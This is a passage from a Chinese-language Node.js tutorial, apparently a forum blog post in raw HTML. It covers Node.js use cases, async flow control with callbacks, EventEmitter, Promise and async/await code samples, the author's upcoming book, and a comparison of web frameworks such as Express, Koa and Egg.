）</li>\n<li>vsc功能和textmate、sublime、notepad++，ultraedit等比较，毫不逊色</li>\n<li>vsc尤其是在nodejs（调试）和typescript、go上支持尤其好</li>\n<li>vsc提供了自定义 Debugger Adapter 和 VSCode Debug Protocol 从而实现自己的调试器</li>\n</ul>\n<p>值得一学，我推荐VSCode编辑器！</p>\n<p>更多调试方法，参见https://github.com/i5ting/node-debug-tutorial</p>\n<h3>Node.js应用场景</h3>\n<p>《Node.js in action》一书里说，Node.js 所针对的应用程序有一个专门的简称：DIRT。它表示数据密集型实时（data-intensive real-time）程序。因为 Node.js 自身在 I/O 上非常轻量，它善于将数据从一个管道混排或代理到另一个管道上，这能在处理大量请求时持有很多开放的连接，并且只占用一小部分内存。它的设计目标是保证响应能力，跟浏览器一样。</p>\n<p>这话不假，但在今天来看，DIRT 还是范围小了。其实 DIRT 本质上说的 I/O 处理的都算，但随着大前端的发展，Node.js 已经不再只是 I/O 处理相关，而是更加的“Node”！</p>\n<p>Node.js 使用场景主要分为4大类</p>\n<p><img src=\"//static.cnodejs.org/FlXC-FcqbkX4B9ToqUVEy1m-H9Vl\" alt=\"屏幕快照 2017-05-17 07.25.05.png\"></p>\n<ul>\n<li>1）跨平台：覆盖你能想到的面向用户的所有平台，传统的PC Web端，以及PC客户端 <code>nw.js/electron</code> 、移动端 <code>cordova</code>、HTML5、<code>react-native</code>、<code>weex</code>，硬件 <code>ruff.io</code> 等</li>\n<li>2）Web应用开发：网站、Api、RPC服务等</li>\n<li>3）前端：三大框架 React \\ <code>Vue</code> \\ <code>Angular</code> 辅助开发，以及工程化演进过程（使用<code>Gulp</code> /Webpack 构建 Web 开发工具）</li>\n<li>4）工具：<code>npm</code>上各种工具模块，包括各种前端预编译、构建工具 <code>Grunt</code> / <code>Gulp</code>、脚手架，命令行工具，各种奇技淫巧等</li>\n</ul>\n<p>下面列出具体的 Node.js 的使用场景，以模块维度划分</p>\n<table>\n<thead>\n<tr>\n<th>分类</th>\n<th>描述</th>\n<th>相关模块</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>网站</td>\n<td>类似于 <code>cnodejs.org</code> 这样传统的网站</td>\n<td><code>Express</code> / <code>Koa</code></td>\n</tr>\n<tr>\n<td>Api</td>\n<td>同时提供给移动端，PC，<code>H5</code> 等前端使用的 <code>HTTP Api</code> 接口</td>\n<td><code>Restify</code> / <code>HApi</code></td>\n</tr>\n<tr>\n<td>Api代理</td>\n<td>为前端提供的，主要对后端Api接口进行再处理，以便更多的适应前端开发</td>\n<td><code>Express</code> / <code>Koa</code></td>\n</tr>\n<tr>\n<td>IM即时聊天</td>\n<td>实时应用，很多是基于 <code>WebSocket</code>协议的</td>\n<td><code>Socket.io</code> / <code>sockjs</code></td>\n</tr>\n<tr>\n<td>反向代理</td>\n<td>提供类似于 <code>nginx</code> 反向代理功能，但对前端更友好</td>\n<td><code>anyproxy</code> / <code>node-http-proxy</code> / <code>hiproxy</code></td>\n</tr>\n<tr>\n<td>前端构建工具</td>\n<td>辅助前端开发，尤其是各种预编译，构建相关的工具，能够极大的提高前端开发效率</td>\n<td><code>Grunt</code> / <code>Gulp</code> / <code>Bower</code> / Webpack / <code>Fis3</code> / <code>YKit</code></td>\n</tr>\n<tr>\n<td>命令行工具</td>\n<td>使用命令行是非常酷的方式，前端开发自定义了很多相关工具，无论是shell命令，node脚本，还是各种脚手架等，几乎每个公司\\小组都会自己的命令行工具集</td>\n<td><code>Cordova</code> / <code>Shell.js</code></td>\n</tr>\n<tr>\n<td>操作系统</td>\n<td>有实现，但估计不太会有人用</td>\n<td><code>NodeOS</code></td>\n</tr>\n<tr>\n<td>跨平台打包工具</td>\n<td>使用 Web 开发技术开发PC客户端是目前最流行的方式，会有更多前端开发工具是采用这种方式的</td>\n<td>PC端的electron、nw.js，比如钉钉PC客户端、微信小程序IDE、微信客户端，移动的Cordova，即老的Phonegap，还有更加有名的一站式开发框架Ionicframework</td>\n</tr>\n<tr>\n<td>P2P</td>\n<td>区块链开发、BT客户端</td>\n<td><code>webtorrent</code> / <code>ipfs</code></td>\n</tr>\n<tr>\n<td>编辑器</td>\n<td><code>Atom</code> 和 <code>VSCode</code> 都是基于 <code>electron</code> 模块的</td>\n<td><code>electron</code></td>\n</tr>\n<tr>\n<td>物联网与硬件</td>\n<td>ruff.io和很多硬件都支持node sdk</td>\n<td><code>ruff</code></td>\n</tr>\n</tbody>\n</table>\n<p>Node.js 应用场景非常丰富，比如 Node.js 可以开发操作系统，但一般我都不讲的，就算说了也没多大意义，难道大家真的会用吗？一般，我习惯将 Node.js 应用场景氛围7个部分。</p>\n<p>1）初衷，server端，不想成了前端开发的基础设施\n2）命令行辅助工具，甚至可以是运维\n3）移动端：cordova，pc端：nw.js和electron\n4）组件化，构建，代理\n5）架构，前后端分离、api proxy\n6）性能优化、反爬虫与爬虫</p>\n<ol>\n<li>全栈最便捷之路</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>编号</th>\n<th>场景</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>反向代理</td>\n<td>Node.js可以作为nginx这样的反向代理，虽然线上我们很少这样做，但它确确实实可以这样做。比如node-http-proxy和anyproxy等，其实使用Node.js做这种请求转发是非常简单的，在后面的http章节里，有单独的讲解。</td>\n</tr>\n<tr>\n<td>2</td>\n<td>爬虫</td>\n<td>有大量的爬虫模块，比如node-crawler等，写起来比python要简单一些，尤其搭配jsdom（node版本的jQuery）类库的，对前端来说尤其友好</td>\n</tr>\n<tr>\n<td>3</td>\n<td>命令行工具</td>\n<td>所有辅助开发，运维，提高效率等等可以用cli做的，使用node来开发都非常合适，是编写命令行工具最简单的方式，java8以后也参考了node的命令行实现</td>\n</tr>\n<tr>\n<td>4</td>\n<td>微服务与RPC</td>\n<td>node里有各种rpc支持，比如node编写的dnode，seneca，也有跨语言支持的grpc，足够应用了</td>\n</tr>\n<tr>\n<td>5</td>\n<td>微信公众号开发</td>\n<td>相关sdk，框架非常多，是快速开发的利器</td>\n</tr>\n<tr>\n<td>6</td>\n<td>前端流行SSR &amp;&amp; PWA</td>\n<td>SSR是服务器端渲染，PWA是渐进式Web应用，都是今年最火的技术。如果大家用过，一定对Node.js不陌生。比如React、Vuejs都是Node.js实现的ssr。至于pwa的service-worker也是Node.js实现的。那么为啥不用其他语言实现呢？不是其他语言不能实现，而是使用Node.js简单、方便、学习成本低，轻松获得高性能，如果用其他语言，我至少还得装环境</td>\n</tr>\n</tbody>\n</table>\n<p>可以说目前大家能够看到的、用到的软件都有 Node.js 身影，当下最流行的软件写法也大都是基于 Node.js 的，比如 PC 客户端 <a href=\"https://github.com/luin/medis\">luin/medis</a> 采用 <code>electron</code> 打包，写法采用 React + Redux。我自己一直的实践的【Node全栈】，也正是基于这种趋势而形成的。在未来，Node.js 的应用场景会更加的广泛，更多参见 <a href=\"https://github.com/sindresorhus/awesome-nodejs\">sindresorhus/awesome-nodejs</a>。</p>\n<h3>Node核心：异步流程控制</h3>\n<p>Node.js是为异步而生的，它自己把复杂的事儿做了（高并发，低延时），交给用户的只是有点难用的Callback写法。也正是坦诚的将异步回调暴露出来，才有更好的流程控制方面的演进。也正是这些演进，让Node.js从DIRT（数据敏感实时应用）扩展到更多的应用场景，今天的Node.js已经不只是能写后端的JavaScript，已经涵盖了所有涉及到开发的各个方面，而Node全栈更是热门种的热门。</p>\n<p>直面问题才能有更好的解决方式，Node.js的异步是整个学习Node.js过程中重中之重。</p>\n<ul>\n<li>\n<ol>\n<li>异步流程控制学习重点</li>\n</ol>\n</li>\n<li>2）Api写法：Error-first Callback 和 EventEmitter</li>\n<li>3）中流砥柱：Promise</li>\n<li>4）终极解决方案：Async/Await</li>\n</ul>\n<h4>1) 异步流程控制学习重点</h4>\n<p>我整理了一张图，更直观一些。从09年到现在，8年多的时间里，整个Node.js社区做了大量尝试，其中曲折足足够写一本书的了。大家先简单了解一下。</p>\n<p><img src=\"//static.cnodejs.org/FowNmdNw00ghB3PxKtMz9ajo2i5c\" alt=\"Screen Shot 2017-04-05 at 08.43.08.png\"></p>\n<ul>\n<li>红色代表Promise，是使用最多的，无论async还是generator都可用</li>\n<li>蓝色是Generator，过度货</li>\n<li>绿色是Async函数，趋势</li>\n</ul>\n<p><strong>结论</strong>：Promise是必须会的，那你为什么不顺势而为呢？</p>\n<p><strong>推荐</strong>：使用Async函数 + Promise组合，如下图所示。</p>\n<p>其实，一般使用是不需要掌握上图中的所有技术的。对于初学者来说，先够用，再去深究细节。所以，精简一下，只了解3个就足够足够用了。</p>\n<p><img src=\"//static.cnodejs.org/Flepwa2gOwCimQX5JbOdL5bK74s1\" alt=\"Screen Shot 2017-04-05 at 08.43.34.png\"></p>\n<p>结论</p>\n<ol>\n<li>Node.js SDK里callback写法必须会的。</li>\n<li>Node.js学习重点: Async函数与Promise\n<ol>\n<li>中流砥柱：Promise</li>\n<li>终极解决方案：Async/Await</li>\n</ol>\n</li>\n</ol>\n<p>所以下面我们会分个小部分进行讲解。</p>\n<h4>2）Api写法：Error-first Callback 和 EventEmitter</h4>\n<p>a）Error-first Callback\n定义错误优先的回调写法只需要注意2条规则即可：</p>\n<ul>\n<li>回调函数的第一个参数返回的error对象，如果error发生了，它会作为第一个err参数返回，如果没有，一般做法是返回null。</li>\n<li>回调函数的第二个参数返回的是任何成功响应的结果数据。如果结果正常，没有error发生，err会被设置为null，并在第二个参数就出返回成功结果数据。</li>\n</ul>\n<p>下面让我们看一下调用函数示例，Node.js 文档里最常采用下面这样的回调方式：</p>\n<pre class=\"prettyprint language-js\"><code>function(err, res) {\n  &#x2F;&#x2F; process the error and result\n}\n</code></pre><p>这里的 <code>callback</code> 指的是带有2个参数的函数：&quot;err&quot;和 “res”。语义上讲，非空的“err”相当于程序异常；而空的“err”相当于可以正常返回结果“res”，无任何异常。</p>\n<p>b）EventEmitter</p>\n<p>事件模块是 Node.js 内置的对观察者模式“发布/订阅”（publish/subscribe）的实现，通过<code>EventEmitter</code>属性，提供了一个构造函数。该构造函数的实例具有 <code>on</code> 方法，可以用来监听指定事件，并触发回调函数。任意对象都可以发布指定事件，被 <code>EventEmitter</code> 实例的 <code>on</code> 方法监听到。</p>\n<p>在node 6之后，可以直接使用<code>require('events')</code>类</p>\n<pre class=\"prettyprint language-js\"><code>var EventEmitter = require(&#x27;events&#x27;)\nvar util = require(&#x27;util&#x27;)\n\nvar MyEmitter = function () {\n \n}\n\nutil.inherits(MyEmitter, EventEmitter)\n\nconst myEmitter = new MyEmitter();\n\nmyEmitter.on(&#x27;event&#x27;, (a, b) =&gt; {\n  console.log(a, b, this);\n    &#x2F;&#x2F; Prints: a b {}\n});\n\nmyEmitter.emit(&#x27;event&#x27;, &#x27;a&#x27;, &#x27;b&#x27;);\n</code></pre><p>和jquery、vue里的Event是非常类似的。而且前端自己也有EventEmitter。</p>\n<p>c）如何更好的查Node.js文档</p>\n<p>API是应用程序接口Application Programming Interface的简称。从Node.js异步原理，我们可以知道，核心在于 Node.js SDK 中API调用，然后交由EventLoop（Libuv）去执行，所以我们一定要熟悉Node.js的API操作。</p>\n<p>Node.js的API都是异步的，同步的函数是奢求，要查API文档，在高并发场景下慎用。</p>\n<p>笔者推荐使用 <a href=\"https://kapeli.com/dash\">Dash</a> 或 <a href=\"https://zealdocs.org/\">Zeal</a> 查看离线文档，经常查看离线文档，对Api理解会深入很多，比IDE辅助要好，可以有效避免离开IDE就不会写代码的窘境。</p>\n<p><img src=\"//static.cnodejs.org/FrIj8UUZLjtGeZDA8RQeBTxff55l\" alt=\"api.png\"></p>\n<h4>3）中流砥柱：Promise</h4>\n<p>回调地狱</p>\n<p>Node.js 因为采用了错误优先的回调风格写法，导致sdk里导出都是回调函数。如果组合调用的话，就会特别痛苦，经常会出现回调里嵌套回调的问题，大家都非常厌烦这种写法，称之为Callback Hell，即回调地狱。一个经典的例子来自著名的Promise模块<a href=\"https://github.com/kriskowal/q\">q</a>文档里。</p>\n<pre class=\"prettyprint language-js\"><code>step1(function (value1) {\n    step2(value1, function(value2) {\n        step3(value2, function(value3) {\n            step4(value3, function(value4) {\n                &#x2F;&#x2F; Do something with value4\n            });\n        });\n    });\n});\n</code></pre><p>这里只是做4步，嵌套了4层回调，如果更多步骤呢？很多新手浅尝辄止，到这儿就望而却步，粉转黑。这明显不够成熟，最起码你要看看它的应对解决方案吧！</p>\n<p>Node.js 约定所有Api都采用错误优先的回调方式，这部分场景都是大家直接调用接口，无太多变化。而Promise是对回调地狱的思考，或者说是改良方案。目前使用非常普遍，可以说是在async函数普及之前唯一一个通用性规范，甚至 Node.js 社区都在考虑 Promise 化，可见其影响之大。</p>\n<p>Promise最早也是在commonjs社区提出来的，当时提出了很多规范。比较接受的是promise/A规范。后来人们在这个基础上，提出了promise/A+规范，也就是实际上现在的业内推行的规范。ES6 也是采用的这种规范。</p>\n<p>Promise意味着[许愿|承诺]一个还没有完成的操作，但在未来会完成的。与Promise最主要的交互方法是通过将函数传入它的then方法从而获取得Promise最终的值或Promise最终最拒绝（reject）的原因。要点有三个：</p>\n<ul>\n<li>递归，每个异步操作返回的都是promise对象</li>\n<li>状态机：三种状态转换，只在promise对象内部可以控制，外部不能改变状态</li>\n<li>全局异常处理</li>\n</ul>\n<p>1)定义</p>\n<pre class=\"prettyprint language-js\"><code>var promise = new Promise(function(resolve, reject) {\n  &#x2F;&#x2F; do a thing, possibly async, then…\n\n  if (&#x2F;* everything turned out fine *&#x2F;) {\n    resolve(&quot;Stuff worked!&quot;);\n  }\n  else {\n    reject(Error(&quot;It broke&quot;));\n  }\n});\n</code></pre><p>每个Promise定义都是一样的，在构造函数里传入一个匿名函数，参数是resolve和reject，分别代表成功和失败时候的处理。</p>\n<p>2)调用</p>\n<pre class=\"prettyprint language-js\"><code>promise.then(function(text){\n    console.log(text)&#x2F;&#x2F; Stuff worked!\n    return Promise.reject(new Error(&#x27;我是故意的&#x27;))\n}).catch(function(err){\n    console.log(err)\n})\n</code></pre><p>它的主要交互方式是通过then函数，如果Promise成功执行resolve了，那么它就会将resolve的值传给最近的then函数，作为它的then函数的参数。如果出错reject，那就交给catch来捕获异常就好了。</p>\n<p>Promise 的最大优势是标准化，各类异步工具库都按照统一规范实现，即使是async函数也可以无缝集成。所以用 Promise 封装 API 通用性强，用起来简单，学习成本低。在async函数普及之前，绝大部分应用都是采用Promise来做异步流程控制的，所以掌握Promise是Node.js学习过程中必须要掌握的重中之重。</p>\n<p>Bluebird是 Node.js 世界里性能最好的Promise/a+规范的实现模块，Api非常齐全，功能强大，是原生Promise外的不二选择。</p>\n<p>好处如下：</p>\n<ul>\n<li>避免Node.js内置Promise实现 问题，使用与所有版本兼容</li>\n<li>避免Node.js 4曾经出现的内存泄露问题</li>\n<li>内置更多扩展，timeout、 promisifyAll等，对Promise/A+规范提供了强有力的补充</li>\n</ul>\n<p>限于时间关系，这里就不一一列举了，还是那句话，在学习Node.js过程中，对于Promise了解多深入都不过分。</p>\n<p>推荐学习资料</p>\n<ul>\n<li>Node.js最新技术栈之Promise篇  <a href=\"https://cnodejs.org/topic/560dbc826a1ed28204a1e7de\">https://cnodejs.org/topic/560dbc826a1ed28204a1e7de</a></li>\n<li>理解 Promise 的工作原理 <a href=\"https://cnodejs.org/topic/569c8226adf526da2aeb23fd\">https://cnodejs.org/topic/569c8226adf526da2aeb23fd</a></li>\n<li>Promise 迷你书 <a href=\"http://liubin.github.io/promises-book/\">http://liubin.github.io/promises-book/</a></li>\n</ul>\n<h4>4）终极解决方案：Async/Await</h4>\n<p>Async/Await是异步操作的终极解决方案，Koa 2在node 7.6发布之后，立马发布了正式版本，并且推荐使用async函数来编写Koa中间件。</p>\n<p>这里给出一段Koa 2应用里的一段代码</p>\n<pre class=\"prettyprint\"><code>exports.list = async (ctx, next) =&gt; {\n  try {\n    let students = await Student.getAllAsync();\n  \n    await ctx.render(&#x27;students&#x2F;index&#x27;, {\n      students : students\n    })\n  } catch (err) {\n    return ctx.api_error(err);\n  }\n};\n</code></pre><p>它做了3件事儿</p>\n<ul>\n<li>通过await Student.getAllAsync();来获取所有的students信息。</li>\n<li>通过await ctx.render渲染页面</li>\n<li>由于是同步代码，使用try/catch做的异常处理</li>\n</ul>\n<p>是不是非常简单，现在Eggjs里也都是这样同步的代码。</p>\n<p>4.1 正常写法</p>\n<pre class=\"prettyprint\"><code>const pkgConf = require(&#x27;pkg-conf&#x27;);\n\nasync function main(){\n\tconst config = await pkgConf(&#x27;unicorn&#x27;);\n\n\tconsole.log(config.rainbow);\n\t&#x2F;&#x2F;=&gt; true\n}\n\nmain();\n</code></pre><p>变态写法</p>\n<pre class=\"prettyprint\"><code>const pkgConf = require(&#x27;pkg-conf&#x27;);\n\n(async () =&gt; {\n\tconst config = await pkgConf(&#x27;unicorn&#x27;);\n\n\tconsole.log(config.rainbow);\n\t&#x2F;&#x2F;=&gt; true\n})();\n</code></pre><p>4.2 await + Promise</p>\n<pre class=\"prettyprint\"><code>const Promise = require(&#x27;bluebird&#x27;);\nconst fs = Promise.promisifyAll(require(&quot;fs&quot;));\n\nasync function main(){\n    const contents = await fs.readFileAsync(&quot;myfile.js&quot;, &quot;utf8&quot;)\n    console.log(contents);\n}\n\nmain();\n</code></pre><p>4.3 await + co + generator</p>\n<pre class=\"prettyprint\"><code>const co = require(&#x27;co&#x27;);\nconst Promise = require(&#x27;bluebird&#x27;);\nconst fs = Promise.promisifyAll(require(&quot;fs&quot;));\n\nasync function main(){\n   const contents = co(function* () {\n      var result = yield fs.readFileAsync(&quot;myfile.js&quot;, &quot;utf8&quot;)\n      return result;\n   })\n\n\tconsole.log(contents);\n}\n\nmain();\n</code></pre><p>要点</p>\n<ul>\n<li>co的返回值是promise，所以await可以直接接co。</li>\n<li>co的参数是genrator</li>\n<li>在generator里可以使用yield，而yield后面接的有5种可能，故而把这些可以yield接的方式成为yieldable，即可以yield接的。\n<ul>\n<li>Promises</li>\n<li>Thunks (functions)</li>\n<li>array (parallel execution)</li>\n<li>objects (parallel execution)</li>\n<li>Generators 和 GeneratorFunctions</li>\n</ul>\n</li>\n</ul>\n<p>由上面3中基本用法可以推出Async函数要点如下：</p>\n<ul>\n<li>Async函数语义上非常好</li>\n<li>Async不需要执行器，它本身具备执行能力，不像Generator需要co模块</li>\n<li>Async函数的异常处理采用try/catch和Promise的错误处理，非常强大</li>\n<li>Await接Promise，Promise自身就足够应对所有流程了，包括async函数没有纯并行处理机制，也可以采用Promise里的all和race来补齐</li>\n<li>Await释放Promise的组合能力，外加co和Promise的then，几乎没有不支持的场景</li>\n</ul>\n<p>综上所述</p>\n<ul>\n<li>Async函数是趋势，如果Chrome 52. v8 5.1已经支持Async函数(<a href=\"https://github.com/nodejs/CTC/issues/7\">https://github.com/nodejs/CTC/issues/7</a>)了，Node.js支持还会远么？</li>\n<li>Async和Generator函数里都支持promise，所以promise是必须会的。</li>\n<li>Generator和yield异常强大，不过不会成为主流，所以学会基本用法和promise就好了，没必要所有的都必须会。</li>\n<li>co作为Generator执行器是不错的，它更好的是当做Promise 包装器，通过Generator支持yieldable，最后返回Promise，是不是有点无耻？</li>\n</ul>\n<p>小结</p>\n<p>这部分共讲了4个小点，都是极其直接的必须掌握的知识点。</p>\n<ul>\n<li>\n<ol>\n<li>异步流程控制学习重点</li>\n</ol>\n</li>\n<li>2）Api写法：Error-first Callback 和 EventEmitter</li>\n<li>3）中流砥柱：Promise</li>\n<li>4）终极解决方案：Async/Await</li>\n</ul>\n<p>这里再提一下关于Node.js源码阅读问题，很多人api都还没完熟练就去阅读源码，这是非常不赞成的，不带着问题去读源码是比较容易迷失在大量代码中的。效果并不好。</p>\n<p>先用明白，然后再去阅读Node.js源码，然后探寻libuv并发机制。很多人买了朴大的《深入浅出Node.js》一书，看了之后还是不太会用，不是书写的不好，而是步骤不对。</p>\n<ul>\n<li>Node in action和了不起的Node.js是入门的绝好书籍，非常简单，各个部分都讲了，但不深入，看了之后，基本就能用起来了</li>\n<li>当你用了一段之后，你会对Node.js的运行机制好奇，为啥呢？这时候去读朴大的《深入浅出Node.js》一书就能够解惑。原因很简单，九浅一深一书是偏向底层实现原理的书，从操作系统，并发原理，node源码层层解读。如果是新手读，难免会比较郁闷。</li>\n<li>实践类的可以看看雷宗民（老雷）和赵坤（nswbmw）写的书</li>\n</ul>\n<p>我一般给大家的推荐是把Node in action读上5遍10遍，入门干活足够了。剩下的就是反复实践，多写代码和npm模块就好。</p>\n<p>目前所有的书籍几乎都有点过时了，大部分都是Node.js v0.10左右的版本的，我得新书是基于Node.js 8版本的，预计2018年3月或4月出版。别催我，真没法更快了。</p>\n<p>目录</p>\n<ul>\n<li><a href>01 Node.js初识</a></li>\n<li><a href>02 安装与入门</a></li>\n<li><a href>03 更了不起的Node.js</a></li>\n<li><a href>04 更好的Node.js</a></li>\n<li><a href>05 Node.js是如何执行的</a></li>\n<li><a href>06 模块与核心</a></li>\n<li><a href>07 异步写法与流程控制</a></li>\n<li><a href>08 下一代Web框架Koa入门</a></li>\n<li><a href>09 Koa的核心扩展机制：中间件</a></li>\n<li><a href>10 HTTP协议必知必会</a></li>\n<li><a href>11 Koa练习</a></li>\n<li><a href>12 数据库入门</a></li>\n<li><a href>13 数据库进阶</a></li>\n<li><a href>14 视图模板</a></li>\n<li><a href>15 Koa项目实战</a></li>\n<li><a href>16 自己动手写NPM模块</a></li>\n<li><a href>17 Node.js企业级Web开发</a></li>\n<li><a href>18 构建具有Node.js特色的微服务</a></li>\n<li><a href>19 让Node.js跑的更稳</a></li>\n<li><a href>20 让Node.js跑的更快</a></li>\n</ul>\n<p>博文视点的美女编辑在苦逼的整理中，预计出版在3月之后（不要催我，我也没法说），20章，800页+，定价预计在130+。</p>\n<h3>Web编程要点</h3>\n<p>一般，后端开发指的是 Web 应用开发中和视图渲染无关的部分，主要是和数据库交互为主的重业务型逻辑处理。但现在架构升级后，Node.js 承担了前后端分离重任之后，有了更多玩法。从带视图的<strong>传统Web应用</strong>和<strong>面向Api接口应用</strong>，到通过 RPC 调用封装对数据库的操作，到提供前端 Api 代理和网关，服务组装等，统称为<strong>后端开发</strong>，不再是以往只有和数据库打交道的部分才算后端。这样，就可以让前端工程师对开发过程可控，更好的进行调优和性能优化。</p>\n<p>对 Node.js 来说，一直没有在后端取得其合理的占有率，原因是多方面的，暂列几条。</p>\n<ul>\n<li>1）利益分配，已有实现大多是Java或者其他语言，基本是没法撼动的，重写的成本是巨大的，另外，如果用Node写了，那么那些写Java的人怎么办？抢人饭碗，这是要拼命的。</li>\n<li>2）Node相对年轻，大家对Node的理解不够，回调和异步流程控制略麻烦，很多架构师都不愿意花时间去学习。尽管在Web应用部分处理起来非常简单高效，但在遇到问题时并不容易排查定位，对开发者水平要求略高。</li>\n<li>3）开发者技能单一，很多是从前端转过来的，对数据库，架构方面知识欠缺，对系统设计也知之不多，这是很危险的，有种麻杆打狼两头害怕的感觉。</li>\n<li>4）Node在科普、培训、布道等方面做的并不好，国外使用的非常多，国内却很少人知道，不如某些语言做得好。</li>\n</ul>\n<p>尽管如此，Node.js 还是尽人皆知，卷入各种是非风口，也算是在大前端浪潮中大红大紫。原因它的定位非常明确，补足以 JavaScript 为核心的全栈体系中服务器部分。开发也是人，能够同时掌握并精通多门语言的人毕竟不多，而且程序员的美德是“懒”，能使用 JavaScript 一门语言完成所有事儿，为什么要学更多呢？</p>\n<p>对于 Web 应用大致分2种，带视图的<strong>传统Web应用</strong>和<strong>面向Api接口应用</strong>，我们先看一下 Node.js Web 应用开发框架的演进时间线大致如下：</p>\n<ul>\n<li>2010年 TJ Holowaychuk 写的 Express</li>\n<li>2011年 Derby.js 开始开发，8月5日，WalmartLabs 的一位成员 Eran Hammer 提交了 Hapi 的第一次git记录。Hapi 原本是 Postmile 的一部分，并且最开始是基于 Express 构建的。后来它发展成自己自己的框架，</li>\n<li>2012年1月21日，专注于 Rest api 的 Restify 发布1.0版本，同构的 Meteor 开始投入开发，最像Rails 的 Sails 也开始了开发</li>\n<li>2013年 TJ Holowaychuk 开始玩 es6 generator，编写 <code>co</code> 这个 Generator 执行器，并开始了Koa 项目。2013 年下半年李成银开始 ThinkJS，参考 ThinkPHP</li>\n<li>2014年4月9日，Express 发布4.0，进入4.x时代持续到今天，MEAN.js 开始随着 MEAN 架构的提出开始开发，意图大一统，另外 Total.js 开始起步，最像PHP里 Laravel 或 Python 里的 Django 或 <a href=\"http://ASP.NET\">ASP.NET</a> MVC的框架，代表着 Node.js 的成熟，开始从其他语言里的成熟框架借鉴</li>\n<li>2015年8月22日，下一代 Web 框架 Koa 发布1.0，可以在Node.js v0.12下面，通过<code>co</code> 和 generator实现同步逻辑，那时候 <code>co</code> 还是基于 <code>thunkfy</code> 的，在2015年10月30日，ThinkJS发布了首个基于 Es2015+ 特性开发的 v2.0 版本</li>\n<li>2016 年 09 月，蚂蚁金服的 Eggjs，在 JSConf China 2016 上亮相并宣布开源</li>\n<li>2017年2月，下一代Web框架 Koa 发布v2.0正式版</li>\n</ul>\n<p>我们可以根据框架的特性进行分类</p>\n<table>\n<thead>\n<tr>\n<th>框架名称</th>\n<th>特性</th>\n<th>点评</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Express</td>\n<td>简单、实用，路由中间件等五脏俱全</td>\n<td>最著名的Web框架</td>\n</tr>\n<tr>\n<td>Derby.js &amp;&amp; Meteor</td>\n<td>同构</td>\n<td>前后端都放到一起，模糊了开发便捷，看上去更简单，实际上上对开发来说要求更高</td>\n</tr>\n<tr>\n<td>Sails、Total</td>\n<td>面向其他语言，Ruby、PHP等</td>\n<td>借鉴业界优秀实现，也是 Node.js 成熟的一个标志</td>\n</tr>\n<tr>\n<td>MEAN.js</td>\n<td>面向架构</td>\n<td>类似于脚手架，又期望同构，结果只是蹭了热点</td>\n</tr>\n<tr>\n<td>Hapi和Restfy</td>\n<td>面向Api &amp;&amp; 微服务</td>\n<td>移动互联网时代Api的作用被放大，故而独立分类。尤其是对于微服务开发更是利器</td>\n</tr>\n<tr>\n<td>ThinkJS</td>\n<td>面向新特性</td>\n<td>借鉴ThinkPHP，并慢慢走出自己的一条路，对于Async函数等新特性支持，无出其右，新版v3.0是基于Koa v2.0的作为内核的</td>\n</tr>\n<tr>\n<td>Koa</td>\n<td>专注于异步流程改进</td>\n<td>下一代Web框架</td>\n</tr>\n<tr>\n<td>Egg</td>\n<td>基于Koa，在开发上有极大便利</td>\n<td>企业级Web开发框架</td>\n</tr>\n</tbody>\n</table>\n<p>对于框架选型</p>\n<ul>\n<li>业务场景、特点，不必为了什么而什么，避免本末倒置</li>\n<li>自身团队能力、喜好，有时候技术选型决定团队氛围的，需要平衡激进与稳定</li>\n<li>出现问题的时候，有人能够做到源码级定制。Node.js 已经有8年历史，但模块完善程度良莠不齐，如果不慎踩到一个坑里，需要团队在无外力的情况能够搞定，否则会影响进度</li>\n</ul>\n<blockquote>\n<p>Tips：个人学习求新，企业架构求稳，无非喜好与场景而已</p>\n</blockquote>\n<p>Node.js 本来就为了做后端而设计的，这里我们再看看利益问题。Node.js 向后端延伸，必然会触动后端开发的利益。那么 Proxy 层的事儿，前后端矛盾的交界处，后端不想变，前端又求变，那么长此以往，Api接口会变得越来越恶心。后端是愿意把Api的事儿叫前端的，对后端来说，只要你不动我的数据库和服务就可以。</p>\n<p>但是 Node.js 能不能做这部分呢？答案是能的，这个是和 Java、PHP 类似的，一般是和数据库连接到一起，处理带有业务逻辑的。目前国内大部分都是以 Java、PHP 等为主，所以要想吃到这部分并不容易。</p>\n<ul>\n<li>小公司，创业公司，新孵化的项目更倾向于 Node.js ，简单，快速，高效</li>\n<li>微服务架构下的某些服务，使用 Node.js 开发，是比较合理的</li>\n</ul>\n<p>国内这部分一直没有做的很好，所以 Node.js 在大公司还没有很好的被应用，安全问题、生态问题、历史遗留问题等，还有很多人对 Node.js 的误解。</p>\n<ul>\n<li>单线程很脆弱，这是事实，但单线程不等于不能多核并发，而且你还有集群呢</li>\n<li>运维，其实很简单，比其他语言之简单，日志采集、监控也非常简单</li>\n<li>模块稳定性，对于 <code>MongoDB</code>、<code>MySQL</code>、<code>Redis</code> 等还是相当不错，但其他的数据库支持可能没那么好。</li>\n<li>安全问题是个伪命题，所有框架面临的都是一样的。</li>\n</ul>\n<p>这些对于提供Api服务来说已经足够了，本书后面有大量篇幅讲如何使用 Koa 框架来构建Api服务。</p>\n<p>Web编程核心</p>\n<ul>\n<li>异步流程控制（前面讲过了）</li>\n<li>基本框架 Koa或Express，新手推荐Express，毕竟资料多，上手更容易。如果有一定经验，推荐Koa，其实这些都是为了了解Web编程原理，尤其是中间件机制理解。</li>\n<li>数据库 mongodb或mysql都行，mongoose和Sequelize、bookshelf，TypeOrm等都非常不错。对于事物，不是Node.js的锅，是你选的数据库的问题。另外一些偏门，想node连sqlserver等估计还不成熟，我是不会这样用的。</li>\n<li>模板引擎， ejs，jade，nunjucks。理解原理最好。尤其是extend，include等高级用法，理解布局，复用的好处。其实前后端思路都是一样的。</li>\n</ul>\n<h3>迷茫时学习Node.js最好的方法</h3>\n<p>Node.js 编写的包管理器 npm 